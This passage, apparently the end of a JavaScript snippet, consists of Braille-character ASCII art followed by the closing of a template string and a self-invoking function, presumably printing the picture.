⠿⣿⠟⣹⠟⢭⡳⣄⠢⠄⠂⠄⠒⡐⡀⢘⡳⣾⣆⠢⣕⠌⠻⢦⠼⠁⡀⠀⡐⣋⣴⢸⣿⣿⣿⣿⣿⣿⣟⣿⢱⣿⣿⡿⢟⠀⢣⢏⡑⠤⠀⠀⠆⢩⣿⣿⣿⣿⢳⠻⣽⢸⡋⡰⡽
⣶⡏⣼⠏⠀⠀⠉⠻⣷⡀⠀⠈⠜⠆⢤⣬⣹⣈⡒⢪⣷⠍⢄⡠⠐⠒⢰⠼⣇⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇⣾⣿⣉⣤⣢⠆⢨⢢⢀⠐⡆⠰⠂⣾⣿⣿⣿⢧⣏⣿⣯⡗⣰⡽⣷
⠏⣼⡟⠀⠀⠀⠀⠀⠈⠳⢄⡈⠇⣸⣏⢳⡀⠄⣱⣯⣏⣀⠡⠐⣠⡏⠃⣾⣿⢶⣿⣿⣾⣿⣿⣿⣿⣿⡿⢠⣿⡾⣻⣾⢏⠀⢂⠃⢌⠂⡀⣴⣸⣿⣿⣿⣏⣯⣾⣿⣙⣰⠿⢿⣿
⣸⡿⠀⠀⠀⠀⠀⠀⠀⠀⠈⠳⢤⠙⠿⡚⢧⠰⢟⣨⣭⣷⣶⣾⣿⣥⣑⠺⣿⣏⣿⣿⣿⣿⣿⣿⣿⣿⡧⢚⣵⡿⠛⣡⠊⠀⠤⣀⣴⣾⡇⢧⣿⣿⣿⣿⣽⣿⣿⣿⠿⠛⠻⠇⣿`));
})();